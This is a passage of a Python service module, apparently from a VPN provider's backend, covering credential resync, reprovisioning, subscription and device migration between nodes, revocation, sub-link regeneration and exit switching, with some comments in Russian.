        # the node even though is_active=False — otherwise the assign
        # step (which is DB-only, no ansible) hands the user a UUID
        # that's not in xray's config and the client can't connect.
        warm_rows = (
            self.db.query(models.Credential)
            .filter(
                models.Credential.node_id == node.id,
                models.Credential.pool_state == models.CredentialPoolState.warm,
                models.Credential.subscription_id.is_(None),
                models.Credential.proto.in_(_VLESS_FAMILY_PROTOS),
            )
            .all()
        )

        # Accumulate per-protocol client lists. Dedup by (proto, username)
        # because manage_vless_*_user.sh keys on email; the same user
        # showing up twice is harmless but wasteful.
        clients_by_proto: dict[str, list[dict[str, str]]] = {
            proto: [] for proto in _VLESS_FAMILY_PROTOS
        }
        seen: set[tuple[str, str]] = set()

        def _emit(cred: models.Credential, username: str | None) -> None:
            if not username:
                return
            key = (cred.proto, username)
            if key in seen:
                return
            user_uuid = _extract_vless_uuid(cred.config_text)
            if not user_uuid:
                logger.warning(
                    "resync: skipping credential %s (no UUID parsed)", cred.id
                )
                return
            # G.6: carry per-user target wgN so the resync script can
            # (re)attach the email to the correct xray routing rule on
            # multi-link relays. ``None`` (single-link / direct / stale
            # exit_id) becomes ``""`` in the playbook and the script
            # no-ops on the routing pass.
            iface = resolve_exit_interface(self.db, node.id, cred.exit_id)
            entry: dict[str, str] = {"username": username, "uuid": user_uuid}
            if iface:
                entry["exit_interface"] = iface
            clients_by_proto[cred.proto].append(entry)
            seen.add(key)

        for cred, device in assigned_rows:
            # access_username lives on Device for cold-path rows and on
            # Credential for warm-pool rows — fall back across both so a
            # mixed-vintage node still resyncs cleanly.
            username = (
                cred.access_username
                or (device.access_username if device else None)
            )
            _emit(cred, username)

        for cred in warm_rows:
            _emit(cred, cred.access_username)

        total = sum(len(v) for v in clients_by_proto.values())
        if total == 0:
            logger.info("resync: no vless-family clients on node %s", node.id)
            return None

        task = self.create_task(
            "node",
            node.id,
            "resync_vless",
            {
                # clients_by_proto is the authoritative payload the new
                # resync_node.yml reads per-protocol. The flat `clients`
                # list is kept as a backwards-compat shim for any
                # in-flight task rows enqueued by the previous version
                # of this method — it carries only the reality subset
                # because that's what the old playbook expected.
                "clients_by_proto": clients_by_proto,
                "clients": clients_by_proto[
                    models.VPNConfigProtocol.vless_reality.value
                ],
            },
        )
        self.db.commit()
        self.run_task_async(task, node=node)
        return task

    def reprovision_subscription(
        self,
        subscription: models.Subscription,
        *,
        device_name: str | None = None,
        target_node: models.VPNNode | None = None,
        reuse_sub_token: str | None = None,
        reuse_connection_uri: str | None = None,
        reuse_uuid: str | None = None,
    ) -> tuple[models.Device, models.ProvisioningTask]:
        """Add a fresh device to an existing subscription.

        Used by ``services.balance.unfreeze_subscription`` to restore
        connectivity after a freeze. The original ``sub_token`` is
        preserved so the user's dynamic sub-link keeps working — that's
        the only persistent identifier our clients keep, rotating it
        would silently break every installed device.

        Reuses the warm-pool fast path when possible. On a miss, walks
        the cold path: creates one Device + matching Credentials + an
        ansible apply task. Skips device-limit checks because the
        caller has already validated state (frozen subs have zero
        live devices by construction).

        ``target_node`` — provision the new device on a specific node
        instead of ``subscription.node``. Used by
        :meth:`migrate_device_to_node` to relocate a single device
        without touching ``subscription.node_id``. Warm-pool is bypassed
        when a target_node is explicitly passed — warm bundles are
        keyed by sub.node_id and can't be reused on a foreign node.

        ``reuse_uuid`` — pin the VLESS user UUID of the new device to
        an existing value instead of minting a fresh one. Migrate paths
        pass the old device's UUID so installed clients keep their
        per-user identifier across relay moves (the VLESS URI their
        subscription file resolves to stays byte-identical). Warm-pool
        is also bypassed — warm bundles carry their own pre-provisioned
        UUIDs and can't be rebranded without a re-provision round-trip,
        which would defeat the whole point of the warm path.
        """
        user = subscription.user
        node = target_node if target_node is not None else subscription.node
        if node is None:
            raise RuntimeError("subscription has no node — cannot reprovision")
        if not node.is_active:
            raise RuntimeError(f"node {node.id} is not active")

        enabled_configs = [cfg for cfg in node.configs if cfg.is_enabled]
        if not enabled_configs:
            raise RuntimeError("No enabled VPN configs found for node")

        # ── Warm-pool fast path ─────────────────────────────────────────
        from . import warm_pool

        if target_node is None and reuse_uuid is None:
            warm_bundle = warm_pool.try_assign_bundle(self.db, node.id, subscription.id)
            if warm_bundle:
                try:
                    device, task = self._wire_warm_bundle(
                        user,
                        subscription,
                        warm_bundle,
                        device_name,
                        reuse_sub_token=reuse_sub_token,
                        reuse_connection_uri=reuse_connection_uri,
                    )
                    self.db.refresh(subscription)
                    return device, task
                except Exception:
                    logger.exception("warm-pool wiring failed during reprovision, rolling back")
                    self.db.rollback()
                    raise
            else:
                warm_pool.record_pool_miss(self.db, node.id)

        # ── Cold path ───────────────────────────────────────────────────
        device_label = device_name or "primary"
        # Suffix with the current epoch second so a freeze→unfreeze cycle
        # doesn't reuse the previous access_username (which the node may
        # still have in its TTL window after the absent run).
        # Include a short random hex suffix so rapid consecutive calls
        # (e.g. multi-device migration loop) don't collide on username.
        # access_username MUST be unique on the node — without the hex
        # the two calls happening within the same wallclock second would
        # produce identical usernames and ansible would silently skip the
        # second device's provision, corrupting the resync state.
        username = (
            f"user-{user.id}-{subscription.id}-"
            f"{int(utcnow().timestamp())}-{secrets.token_hex(2)}"
        )
        password = secrets.token_urlsafe(12)
        # Migrate paths thread the old device's UUID here so its VLESS
        # URI survives relay relocation byte-for-byte. A malformed value
        # (shouldn't happen — it comes from _extract_vless_uuid which
        # already validated the regex) falls back to a fresh UUID so
        # the reprovision still completes rather than blowing up mid-way.
        if reuse_uuid is not None:
            try:
                user_uuid = uuid.UUID(reuse_uuid)
            except ValueError:
                logger.warning(
                    "reprovision_subscription: reuse_uuid %r is not a valid UUID, "
                    "falling back to freshly generated one",
                    reuse_uuid,
                )
                user_uuid = uuid.uuid4()
        else:
            user_uuid = uuid.uuid4()

        # Migration-stable URI reuse: see _wire_warm_bundle for rationale.
        # Both the sub_token (used in /sub/{token}) AND the encrypted
        # connection_uri (copied verbatim into Device.connection_uri, the
        # string admin UI renders as the per-device "copy link" button)
        # must match the pre-migration values byte-for-byte. If only one
        # is reused, the two UI buttons diverge and users get different
        # URLs from the same row post-migration.
        if reuse_sub_token is not None:
            device_sub_token = reuse_sub_token
        else:
            device_sub_token = secrets.token_urlsafe(32)

        if reuse_connection_uri is not None:
            connection_uri_encrypted = reuse_connection_uri
        else:
            sub_base = os.getenv("SUB_LINK_BASE_URL", "").rstrip("/")
            if sub_base:
                device_uri = f"{sub_base}/{device_sub_token}"
            else:
                device_uri = f"/api/sub/{device_sub_token}"
            connection_uri_encrypted = encrypt(device_uri)

        primary_config = next(
            (c for c in enabled_configs if c.protocol == models.VPNConfigProtocol.vless_reality),
            enabled_configs[0],
        )

        device = models.Device(
            user_id=user.id,
            subscription_id=subscription.id,
            config_id=primary_config.id,
            name=device_label,
            status=models.DeviceStatus.pending,
            access_username=username,
            connection_uri=connection_uri_encrypted,
            sub_token=device_sub_token,
            client_id_hmac=compute_client_id_hmac(device_sub_token),
        )
        self.db.add(device)
        self.db.flush()

        # G.4: fresh bundle on (possibly new) node — pick least-loaded
        # exit once so all protos route through the same egress.
        bundle_exit_id = choose_exit_for_relay(self.db, node)
        protocols_payload: list[dict[str, Any]] = []
        for cfg in enabled_configs:
            if cfg.protocol == models.VPNConfigProtocol.shadowtls_ss:
                cred_text = _build_shadowtls_credential(node, cfg, username, password)
            elif cfg.protocol == models.VPNConfigProtocol.vless_reality:
                cred_text = _build_vless_reality_credential(node, cfg, str(user_uuid))
            elif cfg.protocol == models.VPNConfigProtocol.vless_ws_cdn:
                cred_text = _build_vless_ws_cdn_credential(node, cfg, str(user_uuid))
            elif cfg.protocol == models.VPNConfigProtocol.vless_xhttp:
                cred_text = _build_vless_xhttp_credential(node, cfg, str(user_uuid))
            elif cfg.protocol == models.VPNConfigProtocol.hysteria2:
                cred_text = _build_hysteria2_credential(node, cfg, password)
            else:
                logger.warning("Skipping unsupported protocol %s on node %s", cfg.protocol, node.id)
                continue

            self.db.add(
                models.Credential(
                    subscription_id=subscription.id,
                    device_id=device.id,
                    config_id=cfg.id,
                    node_id=node.id,
                    exit_id=bundle_exit_id,
                    proto=cfg.protocol.value,
                    config_text=encrypt(cred_text),
                    access_username=username,
                    is_active=False,  # activated by _handle_task_outcome on ansible success
                )
            )

            entry: dict[str, Any] = {"proto": cfg.protocol.value, "port": cfg.port}
            if cfg.protocol == models.VPNConfigProtocol.shadowtls_ss:
                entry["method"] = (cfg.settings or {}).get("method", "chacha20-ietf-poly1305")
            protocols_payload.append(entry)

        if not protocols_payload:
            raise RuntimeError("No supported protocols among enabled configs")

        task_payload: dict[str, Any] = {
            "username": username,
            "uuid": str(user_uuid),
            "password": password,
            "protocols": protocols_payload,
            "state": "present",
        }
        # G.6: see provision_subscription — same exit_interface injection.
        exit_iface = resolve_exit_interface(self.db, node.id, bundle_exit_id)
        if exit_iface:
            task_payload["exit_interface"] = exit_iface

        task = self.create_task("device", device.id, "apply", task_payload)
        self.db.commit()
        self.run_task_async(task, node=node)
        self.db.refresh(subscription)
        return device, task

    def migrate_subscription_to_new_node(
        self,
        subscription: models.Subscription,
        *,
        exclude_node_ids: list[int] | None = None,
        target_node_id: int | None = None,
    ) -> tuple[models.VPNNode, models.Device, models.ProvisioningTask]:
        """Move a subscription from its current node to a freshly chosen one.

        Used by stage 5 downscale: when a node is marked ``draining``, the
        drain tick walks its active subscriptions and calls this helper
        to relocate each one. ``sub_token`` is preserved (same as freeze
        → unfreeze) so installed clients keep working — they just refetch
        ``/sub/{token}`` and pick up URIs pointing at the new host on the
        next profile-update interval.

        Steps:
            1. Pick a target node via ``choose_node``, excluding the
               current node (and any caller-supplied extras — used by
               the drain tick to skip other draining nodes in the pool).
            2. Revoke every live device on the old node in the background
               (single ansible call per device, fire-and-forget).
            3. Switch ``subscription.node_id`` to the target.
            4. Reuse ``reprovision_subscription`` to provision a fresh
               device on the new node — that path already handles
               warm-pool fast path + cold-fallback + access_username
               suffix to avoid TTL collisions.

        Raises ``RuntimeError`` if no eligible target node exists in the
        plan's pools — the caller (drain tick) catches this and just
        leaves the sub on the old node, retrying on the next tick.

        ``target_node_id`` — admin override. When set, ``choose_node``
        is called with ``node_id=target_node_id`` which **skips** the
        pool/health/capacity/cooldown filters and only validates that
        the node is ``is_active=True``. Use for admin UI "move user to
        this specific node" — pool rules and warm state don't apply
        because the admin is explicitly taking responsibility.
        """
        old_node = subscription.node
        if old_node is None:
            raise RuntimeError("subscription has no node — cannot migrate")
        plan = subscription.plan
        if plan is None:
            raise RuntimeError("subscription has no plan — cannot migrate")

        excluded = list(exclude_node_ids or [])
        if old_node.id not in excluded:
            excluded.append(old_node.id)

        if target_node_id is not None:
            if target_node_id == old_node.id:
                raise RuntimeError(
                    "target_node_id matches the subscription's current node"
                )
            target = choose_node(self.db, plan, node_id=target_node_id)
        else:
            target = choose_node(self.db, plan, exclude_node_ids=excluded)
        if target.id == old_node.id:
            # Defensive: choose_node should never return an excluded node,
            # but bail loudly if it does — silently re-provisioning on
            # the same draining node would deadlock the drain forever.
            raise RuntimeError("choose_node returned the same draining node")

        # Snapshot names of every live device BEFORE revoke so we can
        # mirror N:N on the target node. Without this the sub collapses
        # to a single "primary" on the target and users lose every extra
        # device they'd bought — sub-link aliasing then points every
        # saved client at the same UUID, which is unusable in parallel.
        #
        # ``reuse_map`` carries the (sub_token, connection_uri) pair per
        # device-name into the reprovision loop so migration preserves
        # every URL users have installed. Without reuse the new Device
        # gets a fresh sub_token and the alias mechanism in /sub/{token}
        # would papers over it — but admin UI "copy link" buttons on the
        # new row render a brand-new URL, so user#1 (on the migrated sub)
        # and user#2 (who received user#1's old URL earlier) end up
        # looking at two different strings. Reusing the tokens keeps all
        # user-visible URLs byte-identical across migration, which is
        # the original pre-regression behaviour.
        live_devices_snapshot = [
            d
            for d in list(subscription.devices)
            if d.status
            not in (models.DeviceStatus.disabled, models.DeviceStatus.revoked)
        ]
        live_names: list[str] = []
        # Per-device (sub_token, connection_uri, vless_uuid) — all three
        # must be carried across the migrate boundary so the new rows on
        # the target node render identical user-facing URIs (admin UI
        # "copy link" and the vless:// payload inside the sub file).
        reuse_map: dict[str, tuple[str | None, str | None, str | None]] = {}
        for d in live_devices_snapshot:
            name_key = d.name or "primary"
            live_names.append(name_key)
            # First occurrence wins — if the user somehow has two live
            # devices with the same name (shouldn't happen but defensive),
            # we only carry one token pair; the second reprovision gets a
            # fresh token.
            if name_key not in reuse_map:
                reuse_map[name_key] = (
                    d.sub_token,
                    d.connection_uri,
                    _device_vless_uuid(d),
                )

        # Revoke old devices first so the slot frees up on the old node
        # before the drain tick re-evaluates capacity. Background is fine:
        # the new device on the target node is the user-visible thing.
        # Revoked Device rows are kept (sub_token stays resolvable); the
        # /sub/{token} endpoint aliases them to a live sibling device.
        for device in list(subscription.devices):
            if device.status in (
                models.DeviceStatus.disabled,
                models.DeviceStatus.revoked,
            ):
                continue
            try:
                self.revoke_device(
                    device, reason=f"migrate from node {old_node.id}", background=True
                )
            except Exception:  # noqa: BLE001
                logger.exception(
                    "revoke_device failed during migration of sub %s device %s",
                    subscription.id,
                    device.id,
                )

        # Free the unique(sub_token) slot on every just-revoked device
        # whose token we intend to reuse on the target node. Without this
        # the reprovision INSERT trips the unique constraint — two rows
        # can't share the same non-null sub_token. Nullable column lets
        # multiple NULLs coexist, which is exactly what we need (the old
        # revoked row keeps its connection_uri for history/audit, just
        # loses its routable token). Alias resolution via /sub/{token}
        # still works because the NEW row carries the token.
        reused_tokens = {t for t, _, _ in reuse_map.values() if t}
        if reused_tokens:
            for d in live_devices_snapshot:
                if d.sub_token and d.sub_token in reused_tokens:
                    d.sub_token = None
            self.db.flush()

        subscription.node_id = target.id
        self.db.add(subscription)
        self.db.flush()
        # SQLAlchemy needs the relationship reloaded so reprovision sees
        # the new node when it walks ``subscription.node.configs``.
        self.db.refresh(subscription)

        if not live_names:
            # Sub had zero live devices — still create one so /sub/{token}
            # aliasing on old revoked rows has a sibling to point at.
            live_names = ["primary"]
        first_device: models.Device | None = None
        first_task: models.ProvisioningTask | None = None
        for name in live_names:
            reuse_token, reuse_uri, reuse_uuid = reuse_map.get(
                name, (None, None, None)
            )
            device, task = self.reprovision_subscription(
                subscription,
                device_name=name,
                reuse_sub_token=reuse_token,
                reuse_connection_uri=reuse_uri,
                reuse_uuid=reuse_uuid,
            )
            if first_device is None:
                first_device = device
                first_task = task
        assert first_device is not None and first_task is not None
        return target, first_device, first_task

    def migrate_subscription_to_free_node(
        self,
        subscription: models.Subscription,
        *,
        auto_ban_old_node: bool = True,
        ban_reason: str | None = None,
        banned_by: str | None = None,
    ) -> tuple[models.VPNNode, models.Device, models.ProvisioningTask, bool]:
        """«Обновить подписку»: переселить на свободный сервер из пула,
        исключив ноды, где юзер забанен, и (опц.) забанив старую ноду.

        Поверх ``migrate_subscription_to_new_node`` (который сам выбирает
        ноду через ``choose_node`` и сохраняет sub_token-инвариант):
          1. Собираем ``NodeUserBan`` юзера → передаём их + текущую ноду
             в ``exclude_node_ids`` (auto-pick их пропустит).
          2. Если ``auto_ban_old_node`` — заносим старую ноду в
             ``NodeUserBan`` (идемпотентно: SELECT + fallback на
             IntegrityError при гонке двух подписок одного юзера), чтобы
             последующее «обновление» не вернуло юзера обратно на неё.

        Возвращает ``(new_node, device, task, banned_old_node)`` — флаг =
        добавили ли новую запись бана (False если она уже была /
        auto_ban выключен / у подписки нет юзера).

        Поднимает ``RuntimeError`` если свободной ноды нет (например, все
        ноды пула в бан-листе юзера) — вызывающий маппит в HTTP 503.
        """
        old_node = subscription.node
        if old_node is None:
            raise RuntimeError("subscription has no node — cannot migrate")
        user = subscription.user

        banned_node_ids: list[int] = []
        if user is not None:
            banned_node_ids = [
                row[0]
                for row in self.db.query(models.NodeUserBan.node_id)
                .filter(models.NodeUserBan.user_id == user.id)
                .all()
            ]

        exclude = list(banned_node_ids)
        if old_node.id not in exclude:
            exclude.append(old_node.id)

        new_node, device, task = self.migrate_subscription_to_new_node(
            subscription, exclude_node_ids=exclude
        )

        banned_old_node = False
        if auto_ban_old_node and user is not None:
            existing = (
                self.db.query(models.NodeUserBan)
                .filter(
                    models.NodeUserBan.user_id == user.id,
                    models.NodeUserBan.node_id == old_node.id,
                )
                .first()
            )
            if existing is None:
                try:
                    self.db.add(
                        models.NodeUserBan(
                            user_id=user.id,
                            node_id=old_node.id,
                            reason=ban_reason
                            or "auto: обновление подписки (свободный сервер)",
                            created_by=banned_by,
                        )
                    )
                    self.db.commit()
                    banned_old_node = True
                except IntegrityError:
                    # Гонка: параллельный migrate-auto для другой подписки
                    # того же юзера уже создал бан (user_id, old_node.id).
                    # uq_node_user_ban → idempotent, просто откатываемся.
                    self.db.rollback()
                    banned_old_node = False

        return new_node, device, task, banned_old_node

    def migrate_device_to_node(
        self,
        device: models.Device,
        *,
        target_node_id: int,
    ) -> tuple[models.VPNNode, models.Device, models.ProvisioningTask]:
        """Move a single device to a different node, leaving siblings alone.

        Unlike :meth:`migrate_subscription_to_new_node`, ``sub.node_id``
        stays on the old node — the sub becomes "split" across nodes.
        Use when admin wants surgical relocation of one client install
        (e.g. user says "my phone is slow", rest of devices are fine).

        New ``add_device`` calls will still default to the old
        ``sub.node`` — split state is visible but not sticky for
        future provisions; admin repeats the override per device.

        ``target_node_id`` bypasses pool/health/capacity/cooldown
        filters — only ``is_active=True`` is enforced (same semantics
        as sub-level migrate with explicit target).
        """
        if device.status in (
            models.DeviceStatus.disabled,
            models.DeviceStatus.revoked,
        ):
            raise RuntimeError(
                f"device is {device.status.value}, must be active/pending"
            )
        sub = device.subscription
        if sub is None:
            raise RuntimeError("device has no subscription")
        plan = sub.plan
        if plan is None:
            raise RuntimeError("subscription has no plan")
        old_node = device.config.node if device.config else sub.node
        if old_node is None:
            raise RuntimeError("device has no current node")
        if target_node_id == old_node.id:
            raise RuntimeError(
                "target_node_id matches device's current node"
            )

        target = choose_node(self.db, plan, node_id=target_node_id)

        # Migration-stable URI reuse (per-device variant). Siblings on
        # the old node are untouched, so only *this* device's token/uri
        # can be safely carried over. See migrate_subscription_to_new_node
        # for the full rationale on the snapshot/NULL/reuse dance.
        # ``reuse_uuid`` pins the new Credential's VLESS user id to the
        # old one so the subscription file the user has installed keeps
        # the exact same vless:// URI — without this the client sees a
        # "new" account on every relay move and has to refetch/rebind.
        reuse_token = device.sub_token
        reuse_uri = device.connection_uri
        reuse_uuid = _device_vless_uuid(device)

        self.revoke_device(
            device,
            reason=f"device-migrate {old_node.id}->{target.id}",
            background=True,
        )
        if reuse_token:
            device.sub_token = None
            # client_id_hmac производный от sub_token — сбрасываем
            # вместе, иначе UNIQUE-индекс заблокирует reuse этого
            # client_id_hmac на новом Device.
            device.client_id_hmac = None
            self.db.flush()
        new_device, task = self.reprovision_subscription(
            sub,
            device_name=device.name,
            target_node=target,
            reuse_sub_token=reuse_token,
            reuse_connection_uri=reuse_uri,
            reuse_uuid=reuse_uuid,
        )
        return target, new_device, task

    def revoke_device(
        self, device: models.Device, *, reason: str | None = None, background: bool = True
    ) -> models.ProvisioningTask:
        # Revoke every protocol the device was provisioned into.
        protocols_payload: list[dict[str, Any]] = []
        seen: set[str] = set()
        for cred in device.credentials:
            if cred.proto in seen:
                continue
            seen.add(cred.proto)
            entry: dict[str, Any] = {"proto": cred.proto}
            if cred.config is not None:
                entry["port"] = cred.config.port
            protocols_payload.append(entry)

        payload = {
            "username": device.access_username,
            "protocols": protocols_payload,
            "state": "absent",
            "reason": reason,
        }
        task = self.create_task("device", device.id, "revoke", payload)
        device.status = models.DeviceStatus.disabled
        for cred in device.credentials:
            cred.is_active = False
            cred.revoked_at = cred.revoked_at or utcnow()
            # Stage 2.5: explicitly transition pool state so warm-pool
            # bookkeeping stays consistent. Credentials that were never
            # in the pool get the same flag — harmless, ``revoked`` is
            # the terminal state for any cred regardless of origin.
            cred.pool_state = models.CredentialPoolState.revoked
        self.db.commit()
        node = device.config.node if device.config else device.subscription.node
        if background:
            self.run_task_async(task, node=node)
        else:
            self.run_task(task, node=node)
        return task

    def revoke_subscription_devices(
        self, subscription: models.Subscription, *, reason: str | None = None
    ) -> list[models.ProvisioningTask]:
        tasks: list[models.ProvisioningTask] = []
        for device in subscription.devices:
            tasks.append(self.revoke_device(device, reason=reason))
        subscription.status = models.SubscriptionStatus.blocked
        self.db.commit()
        return tasks

    def _disable_device_keep_on_node(self, device: models.Device) -> None:
        """Retire a device in the DB WITHOUT revoking it on the node.

        Unlike :meth:`revoke_device` this enqueues **no** ansible task —
        the user's UUID stays in xray.clients[] so an already-connected
        client keeps working on the old config. The Device row is kept
        (status=disabled) per the sub-link invariant, so its sub_token
        keeps resolving via the sibling-alias in ``/api/sub/{token}``.

        Used by :meth:`regenerate_subscription_sublink`: the old link must
        keep flowing while the user picks up the freshly-minted one.
        Nothing prunes the stale UUID off the node — ``resync_node.yml``
        only ever ``add``s, and the relay reconcile touches routing, not
        clients — so the old connection survives every resync until an
        explicit revoke (which we deliberately never issue here).
        """
        device.status = models.DeviceStatus.disabled
        device.updated_at = utcnow()
        for cred in device.credentials:
            cred.is_active = False
            cred.revoked_at = cred.revoked_at or utcnow()
            cred.pool_state = models.CredentialPoolState.revoked
        self.db.flush()

    def regenerate_subscription_sublink(
        self, subscription: models.Subscription
    ) -> list[tuple[models.Device, models.ProvisioningTask]]:
        """Mint a fresh sub-link for every live device, old links stay alive.

        Incident-recovery / "rotate my link" primitive (NOT a server
        move — for that use :meth:`migrate_subscription_to_free_node`).
        For each currently-live device it provisions a BRAND-NEW device
        on the **same** node (fresh sub_token + UUID + credentials, fresh
        ansible apply) and retires the old one via
        :meth:`_disable_device_keep_on_node` — so:

        * the new token shows in the ЛК (the old disabled row drops out
          of the webapp's live-device list),
        * the old token keeps resolving (sibling-alias → new device),
        * the old UUID stays on the node, so the user keeps connecting on
          the old config until they grab the new link.

        Cost is unchanged: ``extra_device_slots`` is never touched and the
        live device count is preserved (one new per retired old). A sub
        with zero live devices (the incident tail — a Device with no
        sub_token, or a fully-revoked sub) gets a single fresh device.

        Returns ``[(new_device, apply_task), ...]``. Raises ``RuntimeError``
        if the sub is not active or has no usable node (caller skips it).
        """
        if subscription.status != models.SubscriptionStatus.active:
            raise RuntimeError(
                f"subscription is {subscription.status.value}, must be active"
            )
        node = subscription.node
        if node is None:
            raise RuntimeError("subscription has no node — cannot regenerate")
        if not node.is_active:
            raise RuntimeError(f"node {node.id} is not active")

        live_devices = [
            d
            for d in subscription.devices
            if d.status
            not in (models.DeviceStatus.revoked, models.DeviceStatus.disabled)
        ]

        results: list[tuple[models.Device, models.ProvisioningTask]] = []

        # Incident tail: a sub with no live device at all (e.g. all got
        # disabled/revoked by a prior half-applied op, or a migrate to a node
        # that failed to provision). DON'T collapse to a single "primary" —
        # that silently drops every extra device the user paid for (the exact
        # "all devices gone, one primary" regression). Rebuild one device per
        # DISTINCT name the sub ever had (latest row per name wins), mirroring
        # migrate_subscription_to_new_node's name snapshot. Fall back to a lone
        # "primary" only for a sub that genuinely never had a named device.
        if not live_devices:
            seen_names: list[str] = []
            for d in sorted(
                subscription.devices,
                key=lambda x: x.updated_at or x.created_at,
                reverse=True,
            ):
                nm = d.name or "primary"
                if nm not in seen_names:
                    seen_names.append(nm)
            for name in seen_names or ["primary"]:
                device, task = self.reprovision_subscription(
                    subscription, device_name=name
                )
                results.append((device, task))
            self.db.commit()
            return results

        # Replace each live device 1:1 so the visible & billable count is
        # preserved. Keep the friendly name so the user sees the same
        # device label after the swap.
        #
        # Per-pair atomicity matters: retire the old device FIRST (DB-only,
        # its UUID stays on the node) so reprovision's own commit flushes
        # the disable AND the new device together — there is never a window
        # where the new row is durable without its retired counterpart.
        # On any failure we roll back just this iteration — the pending
        # disable is undone, leaving the old device live & unreplaced (prior
        # pairs are already committed and survive) — and re-raise so the bulk
        # endpoint records the sub under `failed`. Net: never a duplicate and
        # never an over-count, so the cost invariant holds even on failure.
        for idx, old in enumerate(live_devices, start=1):
            try:
                self._disable_device_keep_on_node(old)
                device, task = self.reprovision_subscription(
                    subscription, device_name=old.name or f"device-{idx}"
                )
                self.db.commit()
            except Exception:
                self.db.rollback()
                raise
            results.append((device, task))

        return results

    def rebuild_subscription_config_text(
        self, subscription: models.Subscription
    ) -> int:
        """Re-mint each live device's stored ``config_text`` from the
        CURRENT VPNConfig — in place. NO new device, NO ``sub_token``
        rotation, NO ansible, NO Telegram nudge.

        The sub-link serves the stored ``config_text`` (it is not rebuilt
        live), so a plain DB fix to a ``VPNConfig`` field (e.g. xhttp
        ``sni``/``port`` restored after DR) never reaches installed
        clients until the baked URI is rebuilt. This walks the sub's live
        devices and rewrites every vless-family credential URI (reality /
        xhttp / ws-cdn) using the SAME UUID (pulled back out of the
        existing blob) against the now-corrected ``cred.config`` on the
        subscription's node — so the user's existing link silently starts
        returning the fixed URI on the next client refresh. Password-based
        protocols (shadowtls / hysteria2) carry no sni/port-derived URI
        and are left untouched.

        Returns the number of credentials whose ``config_text`` changed.
        Raises ``RuntimeError`` if the sub is not active or has no node.
        """
        if subscription.status != models.SubscriptionStatus.active:
            raise RuntimeError(
                f"subscription is {subscription.status.value}, must be active"
            )
        node = subscription.node
        if node is None:
            raise RuntimeError("subscription has no node — cannot rebuild")

        builders = {
            models.VPNConfigProtocol.vless_reality: _build_vless_reality_credential,
            models.VPNConfigProtocol.vless_xhttp: _build_vless_xhttp_credential,
            models.VPNConfigProtocol.vless_ws_cdn: _build_vless_ws_cdn_credential,
        }
        rebuilt = 0
        for device in subscription.devices:
            if device.status in (
                models.DeviceStatus.revoked,
                models.DeviceStatus.disabled,
            ):
                continue
            for cred in device.credentials:
                if cred.pool_state == models.CredentialPoolState.revoked:
                    continue
                cfg = cred.config
                if cfg is None:
                    continue
                builder = builders.get(cfg.protocol)
                if builder is None:
                    continue  # shadowtls / hysteria2 — nothing sni/port-derived
                user_uuid = _extract_vless_uuid(cred.config_text)
                if not user_uuid:
                    continue  # can't rebuild without the existing UUID
                cred.config_text = encrypt(builder(node, cfg, user_uuid))
                rebuilt += 1
        self.db.commit()
        return rebuilt

    def switch_subscription_exit(
        self,
        subscription: models.Subscription,
        new_exit_id: int,
    ) -> list[models.ProvisioningTask]:
        """Re-pin every cred of ``subscription`` to a different exit.

        Only valid when the sub lives on a multi-link relay. Updates
        ``Credential.exit_id`` in DB, then enqueues a single
        ``relay_tunnel`` task that re-runs ``relay_tunnel_apply.yml``
        on the relay — the ``relay_jump_node`` role's
        ``reconcile_xray`` step regenerates every xray config*.json
        from scratch, reading the authoritative ``emails_by_iface``
        map via :func:`build_xray_relay_outbounds`. The email
        therefore lands in ``direct-<new_wgN>`` deterministically,
        independent of any in-flight per-device edits that could
        race a per-device ``manage_vless_*_user.sh`` patch.

        ``exit_id`` передаём в payload: peer membership на exit'е
        действительно не меняется, но bootstrap_exit заодно гонит
        ``wg syncconf`` — если running state WG на целевом exit'е
        разошёлся с диском (handler-скип после ok=unchanged, как
        ловили на батч-attach, см. коммит 6c849e6), именно syncconf
        его чинит. Иначе свежий переключённый юзер попадал бы на
        exit, где peer'а нет в running state → рукопожатие не
        доходит → юзер видит таймауты, хотя БД говорит «переехал».

        Clients keep their VLESS UUID and sub_token; only the xray
        outbound changes, so the visible effect for the user is an
        exit-IP swap on next reconnect. Hysteria2 traffic is not
        affected — hy2 egresses directly from the relay without
        going through xray's freedom outbounds, and those always
        use the relay's primary wgN; the "switch exit" action only
        re-routes vless-family protocols.

        Raises RuntimeError on: sub has no node, new_exit_id not
        in the relay's links.
        """
        node = subscription.node
        if node is None:
            raise RuntimeError("subscription has no node")
        link = (
            self.db.query(models.RelayExitLink)
            .filter(
                models.RelayExitLink.relay_node_id == node.id,
                models.RelayExitLink.exit_id == new_exit_id,
            )
            .first()
        )
        if link is None:
            raise RuntimeError(
                f"Exit {new_exit_id} is not attached to relay {node.id}"
            )

        # Update every cred on the sub. Includes revoked ones so the
        # DB stays consistent — a later reprovision of that device
        # will naturally skip revoked creds, but their exit_id should
        # not lag behind the new pin. reconcile_xray only reads
        # active (+ warm) creds, so revoked rows don't leak into the
        # regenerated routing rules.
        self.db.query(models.Credential).filter(
            models.Credential.subscription_id == subscription.id
        ).update(
            {models.Credential.exit_id: new_exit_id},
            synchronize_session=False,
        )
        self.db.flush()

        task = self.create_task(
            "relay_tunnel",
            node.id,
            "apply",
            {
                "exit_id": new_exit_id,
                "switch_subscription_id": subscription.id,
                "new_exit_id": new_exit_id,
                "new_interface": link.wg_interface_name,
            },
        )
        self.db.commit()
        self.run_task_async(task)
        return [task]

    def switch_device_exit(
        self,
        device: models.Device,
        new_exit_id: int,
    ) -> tuple[int | None, str, list[models.ProvisioningTask]]:
        """Re-pin one device's creds to a different exit on the same relay.

        Unlike :meth:`switch_subscription_exit`, only credentials with
        ``device_id=device.id`` are updated — siblings on the same sub
        stay on their current exits. The relay_tunnel apply task
        rebuilds xray configs from ``emails_by_iface`` (DB truth):
        ``reconcile_xray`` reads active creds grouped by
        ``Credential.exit_id`` via :func:`build_xray_relay_outbounds`,
        so moving one cred row is enough — no ansible-role changes
        needed.

        Returns ``(old_exit_id, new_interface, [task])`` so the HTTP
        route can echo the transition back to the admin.
        """
        sub = device.subscription
        node = device.config.node if device.config else (
            sub.node if sub is not None else None
        )
        if node is None:
            raise RuntimeError("device has no node")
        link = (
            self.db.query(models.RelayExitLink)
            .filter(
                models.RelayExitLink.relay_node_id == node.id,
                models.RelayExitLink.exit_id == new_exit_id,
            )
            .first()
        )
        if link is None:
            raise RuntimeError(
                f"Exit {new_exit_id} is not attached to relay {node.id}"
            )

        first_cred = (
            self.db.query(models.Credential)
            .filter(
                models.Credential.device_id == device.id,
                models.Credential.is_active.is_(True),
            )
            .first()
        )
